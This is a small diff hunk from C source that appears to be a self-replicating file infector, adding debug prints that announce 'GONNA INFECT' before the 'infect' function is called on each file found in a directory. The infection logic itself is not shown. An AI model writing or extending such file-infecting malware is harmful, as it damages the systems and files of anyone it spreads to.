@@ -32,6 +32,9 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 				char *t = ft_add_base(dirname, d->d_name);
 				if (t == NULL)
 					continue;
+				print("GONNA INFECT: ");
+				print(t);
+				println("");
 				infect(t, t, b, bn, crypt_off, crypt_len, opt);
 				ft_free(t);
 			}
